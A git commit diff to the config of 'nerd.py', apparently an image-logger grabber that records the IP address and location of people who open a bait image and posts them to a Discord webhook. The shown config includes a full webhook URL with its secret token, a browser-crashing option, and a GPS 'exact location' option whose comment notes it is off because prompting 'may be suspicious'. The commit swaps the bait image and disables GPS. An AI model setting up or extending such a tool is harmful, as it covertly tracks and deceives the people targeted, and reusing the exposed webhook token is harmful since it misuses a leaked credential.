3a31f69c134c12e79480dda07ff3929e619a47fd
pivetee <145782129+pivetee@users.noreply.github.com>
2023-10-03 17:58:17 +0100

    Update nerd.py

--- api/nerd.py
+++ api/nerd.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1158800492089057290/SBWixRUfTDIKAALBm1eB-kHwsE8S5bYzlomSnmWIqoNNy6fJ7T5DE72gfYePPO1MVlht",
-    "image": "file:///C:/Users/diogo/OneDrive/Imagens/d30d8c091a2415b829919480220c8abe.png", # You can also have a custom image by using a URL argument
+    "image": "https://sgfm.elcorteingles.es/SGFM/dctm/MEDIA03/202102/18/05218630000521____2__600x600.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -24,7 +24,7 @@ config = {
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
